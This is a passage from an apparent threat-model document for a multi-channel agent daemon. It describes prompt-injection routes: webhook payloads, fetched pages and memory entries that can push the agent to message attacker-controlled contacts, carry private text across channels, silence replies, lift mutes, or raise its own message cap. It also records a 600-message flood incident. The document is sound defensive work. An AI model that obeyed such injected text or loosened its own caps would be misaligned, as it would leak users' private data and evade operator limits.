endpoint is cached-input and output tokens. What bounds it: the trigger
fires only at a turn boundary (a final reply with no tool calls pending),
at most one turn-or-idle consolidation is in flight per channel (a turn
that ends while one runs starts nothing), and with forks off it never
runs. The knob is `memory.consolidate_after_tokens`: raising it means
fewer, larger forks. A fork that keeps failing is bounded too (#620):
after three consecutive failed turn forks on a channel the turn trigger
backs off, with one warning, until some consolidation moves the watermark
or `memory.idle_consolidate_after` seconds pass, so a failing backend (or
input that reliably produces an unusable reply) costs three forks and one
retry per interval rather than one fork per turn. Idle and compaction are
not backed off, so the range is still consolidated by them.

Where the tree stands: nothing bounds use over time, and under PRD
principle 16 nothing in corvidae will for now. It schedules a provider's warm
heads but doesn't cap tokens or spend; rate limits on hosted APIs are a
future improvement (#296). `usage_log` records every call, and rate limits
are met only by retrying (PRD §3.6.2). Once built, latency classes (PRD
§3.13.5) bound how long a flooded channel can hold a head a queue with a
bound is waiting for, at the price of a context switch each time it yields; they
don't bound its total.

On a metered endpoint, set a spend limit with the provider, and keep
inbound allowlists tight on any channel with untrusted participants:
inbound admission is the main control on total cost the tree has. Filtering
floods at the transport is a future improvement (#296), with one exception
since #793: `webhook_notify` caps its own deliveries at
`max_notifications` per `per_seconds` per endpoint (10 per hour by default),
so a webhook flood costs at most that many turns per target channel per
window, drop reports included, rather than one turn per delivery (finding 16).
`limits.inbound_per_channel` (finding 24) bounds how many messages one
channel may have waiting, not their rate: each admitted message still costs
a turn.

### 15. One identity across channels (by design)

PRD principle 14 makes the agent one identity on every channel. Retrieval
spans the whole memory with no compartments, any turn can speak on any
channel a transport owns, leave a note for another channel's context, and
read another channel's recent conversation (PRD §3.5.9–11), and there is no
cross-channel allowlist, as a default or as an option. Channels are not a
trust boundary; inbound admission is (principle 9). This is the operator's
decision (2026-11-01), and these are its costs.

- **Private things can surface in rooms other people read.** Inbound
  allowlists say who may *drive* the agent, not who reads its replies.
  Everyone in a Discord guild channel or a public IRC channel reads them.
  Something said on a private Signal channel can come back in a reply
  there: through retrieval, `search_memory`, `recall_raw` (which replays
  another channel's raw dialog, by record or by message range),
  `search_transcripts` (keyword search over every channel's raw messages,
  private and direct-message channels included, tool results as far as
  they sit in `content`, so a secret a tool printed (#508) is one keyword
  away), a goal (finding 10), a note, or the agent
  reading the Signal conversation because a question on the public channel
  made it relevant. The provenance critic's evidence search also quotes
  other channels' raw dialog to the critic, so a critique objection can carry
  it into the window. The sensitivity plugin (#138) is the capability an
  operator can load against this: it filters what enters a window
  (retrieval, notes, reads, and the memory tools' raw
  reads, `search_transcripts` and `recall_raw`) by who is present, though not
  text already in the window. It is off unless loaded, and it isn't built.
  **Without it, this gap is accepted:**
  keep the agent out of rooms where people you haven't allowed can read it,
  or accept that anything it knows can surface there.
- **Background task results are channel-blind.** `task_status` already shows
  every channel's active, pending and completed tasks, and `task_result`
  (PR #594) returns any channel's persisted result *body* by task id — with
  no channel check — and, when `daemon.task_results_path` is set, across a
  restart (the JSONL audit file outlives the 100-entry in-memory deque). A
  task started on a private channel (a Signal contact's request) leaves a
  result that a turn on a public channel can read by id and surface. This is
  the first bullet's gap (what the agent knows can surface anywhere) applied
  to the task side channel, plus a persistence leg. The operator control is
  the same as the first bullet: keep the agent out of rooms where disallowed
  readers can read it, or leave `daemon.task_results_path` unset so results
  are gone with the deque.
- **Text from one channel can steer action on every other.** A web page,
  an MCP result or a distilled memory read on one channel can make the
  model message any contact, send another channel's context a note, or
  pull another channel's conversation into the current window. This is the
  exfiltration leg of the trifecta with people as the destination: a
  Signal contact can be messaged on the strength of text fetched in an IRC
  channel. Inbound default-deny bounds who can inject by talking; it does
  not bound what fetched content says.
  `notify_other_channel` (the cross-channel-send plugin) reaches any
  well-formed `transport:scope` id, not only channels live in the registry:
  it resolves the id the way reminders and `corvidae-inotify` do (#938), so
  a Signal contact or Discord channel nobody has spoken in since the
  restart is reachable too. An id whose transport no plugin owns still
  resolves to a bare channel and is reported as queued, though no reply is
  delivered there.
- **Notes and reads launder untrusted text.** A note is framed as the
  agent's own, so text injected on IRC that prompts a note reaches the
  operator's Signal window in the agent's voice, and a read pulls one
  channel's untrusted text into another's window. With the trust plugin
  loaded, both carry the minimum trust of the source channel's participants
  and low-trust ones are quarantined (PRD §3.5.10–11); without it, they
  arrive unlabelled.
- **Messaging someone first opens the door to them.** Under PRD §3.5.9 a
  one-to-one message to a contact outside the inbound allowlist admits
  their replies on that channel. Injected text (a fetched page, an MCP
  result, a distilled memory) that talks the model into messaging an
  address the attacker controls turns a one-way injection into a
  conversation the attacker drives, with that channel's full tool set.
  Inbound default-deny no longer bounds who can talk to the agent; the
  agent does, and so does whatever steers it. Controls: lock the
  capability; list and revoke admissions; narrow the tools on the
  transport's channels (`channels.signal:*.tools.disabled` and the like);
  and with the trust plugin loaded, weight such contacts low.
- **Floods and loops.** No limit applies to messages the agent starts
  unless the operator sets one (PRD §3.5.9), so one exchange can send up to
  its `max_turns` budget's worth of messages to any one contact, and
  reminders and jobs set on that contact's own channel add to that. A note that wakes
  another channel starts a turn there, and that turn can wake the first,
  but the whole chain shares the `max_turns` budget of the exchange that
  started it (PRD §3.1.3, §3.5.10), so the ping-pong ends when that
  budget does. Nothing in corvidae bounds total spend (finding 14).
- **One poisoned memory reaches every prompt.** With no compartments, a
  record distilled from untrusted text on any channel is retrievable on
  all of them. The trust plugin's quarantine (#138) is the capability an
  operator can load against it; without it, this is finding 3 at the
  agent's full reach.

To narrow what text arriving on a channel with untrusted participants can
make the agent do elsewhere, disable the send, note and read tools there
(`channels.<id>.tools.disabled`) and keep inbound allowlists tight. That
does not stop what the agent knows from surfacing on that channel (first
bullet). For a separate identity, run a second instance with its own
database.

Where the tree stands: memory spans every channel (#168), so the first
bullet's gap is live today wherever the agent speaks in a room people you
haven't allowed can read, and so is the poisoned-memory bullet; goals
already cross channels (finding 10). The note tool exists (#234:
`notify_other_channel` queues a system notification on the target channel and,
since #938, resolves any well-formed channel id), so the note and loop costs
above are live; the plain send (PRD §3.5.9, #234, still open) and the read tool
(#235) do not, so their costs are not. The identity
and register layers are built (#316), but not their runtime overrides and
separate locks.

### 16. The webhook ingress accepts events from the network

`channels/webhook.py` listens for `POST /hook/<endpoint>` and gives each JSON
body to subscribing plugins. It reaches the model only through a subscriber's
`on_notify`, as a fenced notification (PRD §3.3.11); the ingress itself writes
to no conversation. What each auth mode gives:

- **`bearer` with a token.** Whoever holds the token can inject events. The
  token crosses the network in clear on this plain-HTTP listener, so exposing
  an endpoint beyond a trusted network needs a TLS-terminating proxy.
- **`hmac-sha256`.** Proves the body came from a holder of the secret and was
  not altered; it does not hide the body. GitHub signs no timestamp, so a
  captured delivery replays successfully once its id leaves the 32-id window
  or after a restart.
- **`token: null`.** No authentication at all, allowed only on a specific IP
  address. The network is the only control: anyone who can reach that address
  can inject events. A wildcard host or a hostname requires a token.
- Endpoint names are enumerable without a credential (404 versus 401).
- An authenticated sender that floods an endpoint pushes real events out of a
  subscriber's queue (drop-oldest), and each event a subscriber turns into a
  notification spends a turn (finding 14).
- No query string reaches a subscriber, and of the headers only the delivery
  id (`X-GitHub-Delivery` or `Idempotency-Key`) does. Tokens are never
  logged (the access log is off, rejections log the endpoint and address only).

The `webhook-notify` package is the concrete path from a payload to a prompt:
each delivery on a configured endpoint is injected into every target channel
as a fenced notification, so whoever can post to the endpoint chooses text the
model reads there. Provider-side event filtering is no longer the only volume
control: `webhook_notify` throttles per endpoint (#793), on by default. A
sender now costs at most `max_notifications` turns per `per_seconds` per
target channel — 10 per hour out of the box — drop reports counting against the same cap, and the
digest inside a single notification is bounded by `max_payload_chars` inline
and the spill cap on disk, as before. Two residual risks remain. A flood can
still push real events out of the buffer, because the policy is drop-oldest:
the drops are counted, logged and reported to the model, but the event itself
is gone. And the cap protects the turn budget, not the disk: a held buffer
keeps up to `max_buffered` payloads, each of which may spill
`daemon.notification_spill_max_chars` when it flushes, so the spill growth in
the next finding still applies at the capped rate rather than at the sender's
rate.

A payload longer than `max_payload_chars` is cut, and the kernel's
notification spill service writes the full text to a file
(`daemon.notification_spill_dir`) where a channel can read it. That puts
untrusted bytes on disk at sizes the sender influences, up to
`daemon.notification_spill_max_chars` per notification, and the only bounds
are that cap and the age policy (`notification_spill_max_age_days`, checked at
startup and hourly): nothing limits the directory's total size, so a sender
that floods an endpoint fills it at the cap times the rate until the age
catches up. Files are mode 0600 and named by a random UUID, so a name carries
nothing the sender controls and the service only ever deletes names of that
shape. The header offers the path only on a channel where an enabled tool
declares it reads spill files (`read_file`, `shell`). What `read_file` reads
back is fenced: the header's pointer is kernel text, and the file's contents
arrive as a `read_file` result under the untrusted-output header and nonce
fence (#571), though not the notification's own fence, and the header names
the source recorded when the content was spilled, if the log row survives
(#576), and a `cat` of the file through `shell` arrives fenced, though
without the source line, because the stamp needs a whole spill path as its
argument (#580). The spill directory is not inside any tool root
(`read_file` has none until #444), so the file is reachable the same way any
other path is, and the agent can read it whether or not a header pointed at
it.

Tool results over `tools.max_result_chars` are spilled by the same service
(#575), and so are background task results that answer no tool call (#744), so the directory also holds tool output: command output, file
contents, fetched pages and MCP results, any of which can carry secrets or
injected text. Its bounds are the same cap and age, so the directory's worst
case adds the cap times the rate of long tool results. The file is written
only where the channel (or, in a subagent, its tool set) has a spill reader,
and read back the same ways as a notification's. The cut line on an
untrusted result sits in the header, outside the fence. On a trusted result
it heads the unfenced content, so text in that content (the output of a tool
that does not declare itself untrusted, say) could imitate it. That is no new
reach: such output is unfenced by that tool's own declaration and could
imitate any text. In a subagent's loop the cut
line is plain text in the result, with no kernel header at all.

### Smaller things

- The funnel's `ponder` tool lets the model wait, at most 5 s
  (`PONDER_TIMEOUT_SECONDS`, not configurable), for recall already in flight. It is
  a tool call like any other: while it waits it occupies one worker of the shared
  task queue (`daemon.max_task_workers`, default 4), which also carries other
  channels' tool calls, subagents, appraisal and critique; it holds its channel
  busy so idle work (heartbeat, retention, consolidation) stays off; and the
  turn it holds costs an LLM call. It returns at once when no recall is in flight, so
  the hold needs a pending recall to exist. Since #1176 one can: memory's
  retrieval and the recall sources run in `before_compose`, and one that has
  not answered within the channel's check allowance (a slow embedding
  endpoint, say) is still in flight when the model calls a tool. The edge:
  nothing caps how many `ponder` calls one assistant
  message makes, so K calls hold K workers until the same recall settles or 5 s
  pass, at most about ceil(K/4) x 5 s of wall time with the workers held, per message (less once a
  recall settles or times out, which the mixin's own timeout bounds), repeated up to
  `max_turns` times per exchange, and untrusted text can talk the agent into it.
  It reads only the held-text store's in-flight before-compose futures and writes nothing, and its result
  is fixed sentences plus a duration, built in code. A guard (a second concurrent ponder on a channel returns at once)
  is proposed, not built. Remove the tool with `tools.disabled: [ponder]`, or on
  one channel with `channels.<id>.tools.disabled: [ponder]`.
  `plugins.disabled: [funnel]` also removes it, and starts cleanly since goals
  no longer depends on the funnel (#1176); it also removes the admission
  policy, so held text is admitted unbudgeted (finding 3).

- Passive retrieval joins the vector search with a keyword search (#666),
  so a record that names a person, project or identifier surfaces whenever
  a query names it. Since #409 a record the keyword search found is gated
  on its measured cosine like any other, so a shared name ranks it but
  can't by itself admit it. The set of
  reachable records is unchanged (the same `indexed`, `redacted` and trust
  filters apply); what changes is which ones rank. The new edge: someone
  whose words get consolidated into a record can attach that record to a
  name, so it ranks whenever the name comes up, and is admitted only when
  its cosine also clears the gate (by default, stands out from the memory
  for that query). Long, name-stuffed
  records gain little, since bm25 normalises for length and fusion takes
  only one rank from the keyword list. Set
  `memory.retrieval.candidates: vector` to go back to embedding-only
  candidates. `search_memory` now searches by meaning as well as keywords
  (#667). It reaches the same records it always did, filters and demoted
  records included, but a paraphrase now finds what only a shared word found
  before.

- Untrusted text in a chat channel can talk the agent into silence. Where
  `SilencePlugin` is loaded, the system prompt of every IRC, Discord, Signal and
  Zulip channel tells the model it may answer `NO_REPLY` to send nothing (or,
  with `silence.mode` `tool` or `both`, call `end_turn`), and
  a message that says "don't reply to this" may be enough. The worst case is
  a missed reply. The veto is a containment check, so a reply that merely quotes the token (say, repeating an incoming message that contains `NO_REPLY`) is dropped too: untrusted text can get a reply suppressed without the model choosing silence. This is accepted for now, not prevented: the withheld reply is stored `unsent` and recorded as `no_reply`, the cost is one re-prompt, and an exact-match veto would instead leak the token to users whenever the model writes anything beside it. Narrowing the match without that leak is #902. A decline is a `silence` record in the outcome log
  (`silence` is `no_reply` or `empty`) only when `outcome_log` is loaded
  and the turn has a trace id, so look there to find them. With
  `silence.mode: tool` or `both` the agent also has an `end_turn(reason)` tool,
  a second route to the same effect: an injected "don't reply" can get the
  tool called. The tool is in the tool list of every channel and refuses on
  any that isn't conversational. The record is `silence = "tool"`,
  written when the turn ends and only if its final was withheld, so it shows a
  call that stayed silent; a follow-up that was sent records nothing.
  `silence_reason` is the model's own words,
  steerable by an injection, cut at 200 characters and stored in
  the outcome log, which is for offline analysis; check before routing
  it into a prompt. It adds no capability: the agent could already stay quiet by sending an empty final,
  and nothing it can reach changes. A custom `register_prompt`, or an empty
  one, does not remove the instruction. If a channel must always answer,
  disable `silence`; to drop only the tool, list `end_turn` in `tools.disabled`
  and set `silence.mode: token`.

- Control-token strings (`<|im_start|>`, `<|endoftext|>`) and bare
  `<think>`/`</think>`/`<tool_call>`/`</tool_call>`/`<tool_response>`/`</tool_response>` tags in untrusted
  text are made inert in every chat request (`LLMClient.chat`, #356), so a
  fetched page can't inject chat-template structure or end every reply
  that quotes it. Not covered: other added tokens without the `<|…|>` shape, which can still reach the model as
  real tokens from fetched text; MCP tool descriptions in `tools`
  (finding 6); and the model emitting a control token on its own.

- `read_file` has a stat-then-read race and follows symlinks. Irrelevant
  while finding 4 stands.
- `tools.max_file_read_bytes` bounds only an unranged `read_file`; a read
  with `offset`, `length`, `start_line` or `end_line` reaches any part of a file of any size, a page
  at a time. It is a context-size guard, not an access control.
- Tool arguments are not validated against the generated schema. Wrong
  types produce a generic "tool failed". Robustness, not security.
- `task_pipeline` marks a task failed on a non-zero exit code, so
  dependents of a failed step do not run. It reads the code from
  `shell.run_shell`, which returns it beside the output rather than making
  callers parse `Exit code: N` out of the text (#105).
- `web_search` sends conversation-derived queries to DuckDuckGo. By
  design, but it is an off-box data flow nobody sees.
- `harness/install-signal-cli.sh` defaults `SERVICE_USER` to a real
  account name. Not a secret, but it is a real identifier in a public
  repository.
- No secrets in `prompts/` or `docs/`.
- An `unsent` row is not sent to any transport, including web
  and ACP history replay, but it is not secret: it sits in `sessions.db`,
  the JSONL log and the window like any other row, and a fork or
  compaction summary sees it. `unsent` means not said to the channel,
  not redacted.
- The memory surfaces (`memory`, `memory_vec`, `memory_fts`,
  `message_fts`) exist only when the cognition extra has been installed.
  `corvidae redact` probes for each and silently skips one that is absent;
  its `memory` form fails without the `memory` table. `message_fts` and its
  triggers on `message_log` stay in `sessions.db` if the extra is later
  removed, and keep indexing message text. `redact` clears them only while
  it can load sqlite-vec: a database with `memory_vec` (any daemon that ran
  with sqlite-vec) makes every form refuse until the cognition extra is
  reinstalled (#198). That keeps a half-finished redaction from happening,
  at the cost of the only deletion path while the extra is missing.
- The outcome log, `<session db stem>.outcomes.jsonl` beside the session
  database, holds conversation-derived text with no access control beyond
  the file's permissions: stage-2 `past_claims` (quoted from the reply),
  the objection and claim text critique records, and the free-text reasons
  in silence records and `speak_up`. Databases written before the file
  existed keep the same text in `exchange_log` rows. The file is not
  rotated, so it grows with use and keeps what it was given; treat it like
  the session database when backing up or exporting. Through the
  `outcome_log_jsonl` and `exchange_log` scrubbers the cognition extra
  registers under `corvidae.redact`, `corvidae redact` scrubs the claims
  and the provenance and built-in lens critique detail (#160), not the
  silence and `speak_up` reasons. The file scrubber rewrites the file, so
  stop the daemon first. A plugin that keeps its own copy of conversation text
  and registers no scrubber is not reached. `retrieval_candidate` (#407)
  copies no text, only memory ids and scores, but a row naming a redacted
  memory still records that it was retrieved, so its scrubber deletes
  those rows, including ones from retrievals on other channels. A
  retrieval that scored the memory just before the flag landed writes no
  row for it (#654: the insert checks the flag itself), but the held-text store may
  already have admitted its summary into that turn's prompt and bumped its
  access count; the window copy ages out with compaction like any CONTEXT. For
  both, the owning exchange's claims are tombstoned with their
  counts kept (but not when the message was coalesced into a burst
  answered by a later message's turn, #423). What `redact` still doesn't
  reach: proactivity's objection detail in `outcomes` written before
  #1126 (#1003), the free text of silence and `speak_up` reasons, the objection detail of
  lenses other plugins add (`critique.<name>.detail`, finding 23),
  exchanges whose
  `message_rowid` is NULL (and outcome log lines of a trace with none), the conversation JSONL logs and the daemon log, any copy
  taken out of `sessions.db` (a calibration export, a backup), copies on
  other channels (a read of the redacted message, a note or send that
  restates it, and whatever those channels consolidated from them), the
  running daemon's context window (a compaction can write the text back,
  so stop the daemon first), and restatements: any later reply, memory,
  goal or note that paraphrases the message. Redaction can't be made
  complete for that last reason, and it is on hold pending an overhaul;
  [redaction.md](redaction.md) keeps the full list and the PRD requires
  no reach beyond the tombstone (#1005).

### 17. A markdown folder is a new untrusted-text ingress (#719)

`MarkdownRecallPlugin` (entry point `markdown_recall`) mirrors a folder of
markdown files (`markdown_recall.root`) and, on every plain user turn, hands
the top hits to the turn's prompt as CONTEXT framed by the held-text store. The files are untrusted text:
they are the operator's own notes by default, but the folder is operator-
writable and the plugin does not treat its content as trusted. The content
reaches the window only through the held-text store's framing (finding 3:
held-text CONTEXT is a `role: system` row), so the same laundering risk
applies and the same mitigations cover it: the "retrieved data, not
instructions" frame, `mid_conversation_system_role`, and, with the funnel
loaded, the per-source budget (`funnel.budgets.markdown_recall`).

Specific to this source:

- The index parses frontmatter with `yaml.safe_load` (no arbitrary Python)
  and the walk never follows a symlink out of `root`, so a file in the folder
  cannot read a path outside it. A file that is not valid UTF-8 is decoded
  with replacement, never raised on.
- The index is a cache; the files are the source of truth. An encoder or
  chunker change rebuilds it, and an unmounted (zero-file) folder keeps the
  old index rather than looking like mass deletion.
- Embedding sends the chunk text to the embedding stage's endpoint (the same
  data path as memory's embeddings; finding 12 covers hosted endpoints).
- Pointing `root` at a world-writable or shared location makes that location
  an injection surface for the agent; `root` is operator-controlled config,
  so the threat is operator misconfiguration, not a remote attacker (unlike
  finding 16's network ingress).

The residual risk is the same as any held-text source: an operator-controlled
folder whose content is framed, not trusted.

### 18. Reactions: a new tool, and a new way for a sender's text to reach the prompt (accepted, #545, #546, #233)

PRD principle 9 asks for an entry when a tool can do something new or untrusted
text can reach somewhere new. Emoji reactions do both.

**What the tool can do.** `discord_react` / `discord_unreact` and
`signal_react` / `signal_unreact` let the agent add or remove an emoji reaction
as the bot. They take only the emoji. The target is read from the turn's
provenance, never from an argument: the message that started the current turn,
on that turn's own channel. A trace that belongs to another channel, a turn
that did not start from a message, a message the transport has forgotten (a
bounded in-memory map of the last 256 messages from allowed senders; a restart
clears it) all get an error and nothing is sent. So, unlike
`send_attachment` and `send_signal_attachment` (finding 7), there is no
model-chosen channel and no cross-channel reach. Injected text that reaches the
model can make it react to the person who is already talking to it, which is
about as much as it can already do by replying. The emoji argument is
model-controlled and goes to Discord or signal-cli, which judge it; the tools
check only its length (64 characters, 16 code points). The remaining exposure
is the bot's Discord permissions: Add Reactions and Read Message History are
now needed (`docs/discord-ops.md`), and both are channel-wide, not per-message.

**What untrusted text can now reach.** Before this, a Signal reaction was
dropped as an empty message. Now an allowlisted sender's reaction (add only;
removals are dropped) is queued and, at that channel's next turn, appended to
the window as a `role: system` CONTEXT row of the form
`[reaction: <emoji> on <whose> message from <UTC time>]`. The emoji is
sender-controlled text in a system-role row, which is the finding 3 shape, and
this path skips both of its usual guards: the row has no kernel provenance
header (PRD §3.3.11) and it does not go through the held-text store's data-not-instructions
frame. The allowlist check is the transport's own `_is_allowed`, not
`should_process_message`, so a plugin that vetoes there does not see it.

Mitigations:

- The emoji must be **one emoji in a real RGI table** (#780), not merely a
  match for a hand-written shape: `_is_single_emoji` asks the `emoji` package
  whether the whole string is one emoji (after stripping one trailing VS16 when
  what precedes it is itself a table entry, so `👍️` and `👍🏽️` stay accepted),
  and anything else — a tag sequence
  carrying hidden ASCII, enclosed letters joined by ZWJ, a regional-indicator
  word, a non-RGI ZWJ join, two emoji in one string, a trailing newline — is
  dropped with a WARNING naming the sender. Two grammars were tried before this
  and each had a hole, which is why the check is a membership test now. The
  table ships as the `signal` extra and is a guarded import at module load; the transport
  refuses to start without it rather than dropping reactions at run time.
- Every other part of the row is built in code: the whose-message word comes
  from a UUID comparison, and the time from an integer that must be positive and
  below year 9999. A non-integer, boolean or out-of-range timestamp drops the
  reaction.
- A refused sender gets one INFO line and creates no channel and no state. At
  most 20 lines wait per channel; the oldest is dropped with a WARNING.
- No turn starts, so a reaction cannot be used to spend compute (finding 14).
  Only the sender's own channel receives the row.

Accepted residual: the sender is already allowlisted and can send arbitrary text
through the normal path, so the row adds no capability a sender lacks. What it
adds is a route around the header and the held-text frame for one emoji. The accepted
set is now wider than one pictograph — flags, keycaps, ZWJ sequences — and that was
widened through a real table, as this entry asked, rather than a longer regex.
What still holds is the property the mitigation depends on: the accepted string
is a single sequence from a published table, so it cannot spell a sentence or
carry a payload. Waiting
reactions are lost on a crash, and the tools and the event path are verified
against fake clients and a fake signal-cli socket only (PRD §3.2.9).

### 19. The agent can talk to a person without bound (#791)

On 2026-11-12 the agent sent about 600 Signal messages in one night with no
human message in between. Nothing in the kernel counted emissions per channel.
The output gate could withhold a particular message (the silence plugin's
`NO_REPLY`) but not bound a run, so a looping turn — or an injected instruction
that tells the model to keep sending — could hold a channel's attention
indefinitely, at the operator's expense and against the person on the other end.

`OutboundCapPlugin` counts the messages the gate lets through on a channel
since the last admitted human message and withholds everything after
`outbound_cap.max_messages` until a human speaks again. Since #821 it also
enforces an optional sliding window — `outbound_cap.max_messages_per_window`
in `outbound_cap.window_seconds`, off unless configured — which bounds the
cases the between-human counter does not: a channel where a human keeps
talking, or one whose counter keeps being reset. A human message does not
reset the window.

Mitigations and their limits:

- The counter resets on `on_message_admitted`, so a reply to a human is always
  within the cap, and the agent cannot lock itself out of answering.
- A channel with no limit configured is uncapped (fail open: the operator opts
  in), and so is any channel no transport owns (for example
  `internal:heartbeat`), because capping that would break the daemon rather
  than protect a person. Reminders and task results notify the originating
  transport channel, so their finals are capped.
- Only emissions the combined gate verdict lets through count, so another
  gate's veto (a `NO_REPLY`) spends no budget.
- A withheld `final` is still stored as `UNSENT` with a not-sent marker, so the
  agent can see it was held; nothing is silently lost.
- Every withheld emission is logged, the first in a run at `WARNING` with the
  channel, emission, trace id and the limit key that fired, so an operator can
  see a cap doing its work rather than guessing at silence; a message held while
  both limits are reached names both, and the window logs one `WARNING` summary
  when it slides open again.

The agent can raise or clear its own cap through `set_settings`
(`outbound_cap.max_messages`, `outbound_cap.max_messages_per_window`,
`outbound_cap.window_seconds`, `outbound_cap.count_progress`), and an invalid
override fails open, unless the operator lists those keys in
`agent.immutable_settings`.

Accepted residual: the cap bounds *messages*, not turns, so a notification
storm still spends compute (#793). Sends that bypass the gate are uncapped —
`send_signal_attachment`, `signal_react`, tool-status events, the restart
notice — which is acceptable only because each is low-volume and not a reply.
An agent-started send that is later withheld on the target channel has already
returned success to the sending turn, which is why the log is the operator's
signal. And a capped channel is a **self-silencing** route: an injected
instruction can deliberately burn the budget and stop the agent from answering
the person until they send another message, which is the same class of harm as
the existing `NO_REPLY` route, not a new capability.

### 20. `github_webhook`: a sender's strings reach the window, and a run number can silence a report (#792)

PRD principle 9 asks for an entry when untrusted text reaches somewhere new.
The `github-webhook` package turns webhook payloads into one line each, and
the strings in those lines — PR titles, branch names, workflow names — are
chosen by whoever can sign a request to the endpoint (finding 16's HMAC
sender) or by anyone who can open a PR or push a branch in the repository.

Mitigations:

- A line's sender-controlled parts go only into the notification text, which
  the kernel fences (§3.3.11). Annotations carry `origin` alone, minted here,
  so nothing sender-shaped is rendered outside the fence.
- Each sender string is cut to 120 characters and newlines are collapsed, so a
  sender cannot pad a line or fake structure in the header.
- Volume per delivery is at most one line, and one line per completed run, PR
  transition or selected push — `workflow_job` churn, non-terminal runs and
  unselected events are dropped and counted. A GitHub endpoint therefore needs
  no separate rate cap; if one is ever needed, #793's throttle is the shared
  mechanism rather than a second one.
- The plugin owns its endpoints: an endpoint listed in both `github_webhook`
  and `webhook_notify` is warned about at startup, because every subscriber to
  an endpoint receives every delivery and it would otherwise be notified twice.

Accepted residuals. A sender can fabricate `run_number`s to suppress a
cancelled-run report: supersession is inferred from the highest run number
seen per `(repository, workflow, branch)`, the map is in memory, and a forged
high number makes a real cancellation look superseded. The map is lost on
restart, which costs at worst one extra cancelled line. And a hook that
subscribes to only some event types reports superseded cancellations as plain
cancellations, because the `workflow_run` events supersession needs are then
not delivered.

### 21. The retention lens proposes writes to the knowledge base that recall reads back (#742)

With a knowledge base root (`critique.retention.root`, or markdown_recall's
root when that key is unset), the retention critique lens forks the
window after a novel, commitment-dense exchange and may return findings, each
naming a `file` under the root and `content` to append. The finding wakes the
channel (origin `critique`), and the woken turn is told to read the file and
append the content only if it is missing. That is a new route from exchange
text to durable files: a sender's words shape what the lens proposes, the
agent writes it with its own file tools, and when the root is one
`markdown_recall` indexes (finding 17; the default), the written text comes back as CONTEXT
on later turns, in every channel. An injected "fact" can persist past the
conversation that planted it.

Mitigations:

- The lens only flags; nothing is written by the plugin. The write happens in
  an ordinary agent turn, with the agent's own tools and their existing limits
  (the `write_file`/`shell` reach described under "Privilege separation"), and
  the stub tells the agent to read the file first and append only what is
  missing, never rewrite.
- The woken turn is silent by default: its stub ends with `NO_REPLY`, which
  critique's veto on critique-origin finals (and `SilencePlugin`'s, when
  loaded) withholds. Critique judges that turn like any other (#1031), but
  its findings never wake another turn, so a retention finding on it waits
  for the next turn instead of starting a second filing turn.
- The lens is inert unless the operator configures a root: `critique.retention.root`,
  or a markdown_recall block, whose root it then uses. Enabling recall
  therefore enables this route. It runs only when the appraisal fork's
  critique vector picks its question (whether the exchange established a
  durable fact worth filing), or when the sampled share draws it, so an
  ordinary exchange does not fire it.
- Text written to the folder returns only through recall's framing
  (finding 17): "retrieved data, not instructions", under the funnel budget when the funnel is loaded.

Accepted residuals. The lens's `file` is model output: an absolute path or one
with `..` names a file outside the root, and nothing but the agent's judgement
in the filing turn stops that; the file tools' own reach is the bound. A
sender who can steer an exchange can get a false durable "fact" proposed, and
the filing turn's "only if missing" check is the agent's judgement, not a
verification. The knowledge base directory must be writable by the daemon,
which also makes it writable by anything else running as the daemon's user.

### 22. Quiet origins and `speak_up`: a notification source can be muted, and the mute can be lifted from inside the turn (#790)

`gate.send.quiet_origins` lists origins (for example `webhook:github`) whose
turns send nothing to the human: the decide gate withholds their `final`,
`progress`, `thinking` and `error` emissions (the error
fallback too, since a model outage during such a burst is the same flood in
error text, #936; the kernel logs the failure at ERROR regardless). It exists because
the 2026-11-12 flood (finding 19) was the agent answering CI notifications one
by one. While `gates` is loaded the agent also has a `speak_up(reason)`
tool, which lifts the veto for the rest of the calling turn's trace. It is
offered whatever the list holds, so a hot reload that adds a quiet origin is
never left without its hatch (#925).

What changes for untrusted text:

- `speak_up` is in the tool list of every turn while `gates` is loaded,
  whether or not anything is quiet. That includes the turns a quiet source
  drives, so the quiet payload itself, a webhook body or a PR title, can tell
  the agent to call it. Called in a turn
  that isn't quiet, it lifts nothing but still records `outcomes.speak_up`.
  `tools.disabled: [speak_up]` removes it, leaving a veto with no hatch.
  The hatch lifts only this veto: the surfaced final still goes through
  every other `should_send_response` implementation (silence, critique, `outbound_cap`) and the normal not-sent
  marker. A flood of hatch calls is therefore bounded by `outbound_cap`
  (finding 19) when that plugin is loaded and configured, not by this plugin. The call is recorded as
  `outcomes.speak_up` with its reason, so an operator can see which turns
  surfaced and why.
- The hatch never sends anything itself. A design that sent directly would
  have bypassed every gate, `outbound_cap` included.
- The list is a per-channel runtime tunable like every other gate key
  (#928), so `set_settings` can change it, and an injected instruction can
  ask the agent to. A quiet turn's payload can tell the agent to un-quiet its
  own source on that channel, which brings back the reply-per-notification
  flood; a message can also quiet a source the operator wants heard. The owner
  accepted this: the list is a guardrail against floods, not a security
  boundary. The recommended blocklist in configuration.md lists the key, and
  `agent.immutable_settings` locks it. A lock blocks new writes, null
  included, but not an override already set, so a restart clears that (or
  unlock, clear with `null`, and lock again).
  Un-quieting is bounded by `outbound_cap` when that plugin is configured.
- `user` and `reminder` can never be quiet; listing them is ignored with a
  warning. A list that is not a list of strings fails open (nothing is quiet)
  with a warning naming the key, the value and the channel, so a typo cannot
  mute the agent.

Accepted residuals. Progress and thinking sent in the same response as the
`speak_up` call are gated before the tool runs, so they stay withheld. A
follow-up turn whose origin differs from the quiet turn (for example a
`critique` wake) is not quiet. The veto lives in
`GatePlugin`, so disabling `gates` disables it. Only the operator can give
a scheduler job origin `heartbeat` (the only other origin the scheduler
accepts besides `reminder`; no tool takes an origin, #814); if `heartbeat`
is quiet, that mutes the job's own turns, which fails toward silence rather
than toward noise.

### 23. Plugin-added critique lenses: plugin text reaches critic forks and the stage-2 fork, and a lens can wake a turn (#1033, #1078)

A plugin can add critique lenses through `on_critique_init`
([cognition.md](cognition.md#critiqueplugin-lenses-other-plugins-add-on_critique_init)).
Four things are new.

- **Plugin text reaches critic forks.** A lens's brief is appended as the
  instruction of a fork of the live window, after whatever untrusted text
  the window holds (finding 8). It comes from installed plugin code, which
  the operator chose to load (principle 9), so it is operator-trusted, not
  untrusted. A lens is still a new way to steer what the agent tells
  itself.
- **A lens can wake a turn (#1078).** A lens declares `wakes`. With the
  default `False`, its objections re-enter as framed CONTEXT at the
  channel's next turn and wake nothing. With `wakes=True` they wake the
  channel through the same stub as provenance's, so an installed plugin can
  now start a turn. That is bounded three ways: the stub depends on
  configuration only and carries the silence default (reply `NO_REPLY`
